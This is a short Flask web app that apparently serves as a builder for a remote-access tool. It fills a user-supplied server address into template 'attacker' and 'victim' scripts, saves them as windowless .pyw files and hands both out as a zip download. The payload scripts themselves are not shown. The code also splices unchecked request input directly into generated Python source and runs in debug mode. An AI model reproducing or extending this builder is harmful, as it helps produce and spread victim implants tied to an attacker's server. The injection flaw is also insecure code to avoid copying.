import flask 
from flask import Flask, render_template, request, redirect, url_for, send_file

import random

from io import BytesIO
import os

from zipfile import ZipFile
import glob 


app = Flask(__name__)

@app.route('/')
def index():
    files = glob.glob('temp/*')
    for f in files:
        os.remove(f)
        
    return render_template('index.html')

@app.route('/run', methods=['GET', 'POST'])
def run():
    if len(request.values) == 0:
        return 'bro don\'t why u tryna go to /run just go to the homepage'
    
    with open('server/attacker.py', 'r') as f:
        lines = f.read()
        
    new = str(lines).replace('link = "http://127.0.0.1:3000"', 'link = "' + request.values['serverlink'] + '"')
    s = str(random.randint(0, 1000000))
    with open(f"temp/attacker_{s}.pyw", "w+") as f:
        f.write(new)
        
    with open('server/victim.py', 'r') as _f:
        _lines = _f.read()
        
    _new = str(_lines).replace('link = "http://127.0.0.1:3000"', 'link = "' + request.values['serverlink'] + '"')
    _s = str(random.randint(0, 1000000))
    with open(f"temp/victim_{_s}.pyw", "w+") as _f:
        _f.write(_new)
        
    stream = BytesIO()
    with ZipFile(stream, 'w') as zf:
            zf.write(f"temp/attacker_{s}.pyw", os.path.basename(f"temp/attacker_{s}.pyw"))
            zf.write(f"temp/victim_{_s}.pyw", os.path.basename(f"temp/victim_{_s}.pyw"))
    stream.seek(0)
      
        
    return send_file(stream, download_name="saaken.zip", as_attachment=True)

if __name__ == '__main__':
    app.run(debug=True)
